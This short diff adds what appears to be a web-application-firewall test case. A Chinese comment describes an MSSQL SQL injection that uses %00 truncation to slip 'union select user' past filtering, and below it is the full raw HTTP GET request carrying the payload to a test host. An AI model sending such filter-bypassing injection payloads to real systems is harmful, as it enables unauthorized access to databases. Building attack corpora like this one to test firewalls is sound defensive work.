@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_普通注入(%00截断绕过)-06506462
+# 攻击者基于union查询使用%00截断字符进行绕过，将"union%00select%00user"语句注入到 SQL 查询参数中，攻击者通过构造此sql语句可以爆破当前用户信息。
+GET /?id=1%2500union%2500select%2500user&bid=hd_tag_m8mv26m1 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26m1
+RM-PRO-Token: 52591e20971edc236c6a346a3c3a0db4
+RM-PRO-Time: 1742808634399
+User-Agent: curl/7.83.1
+
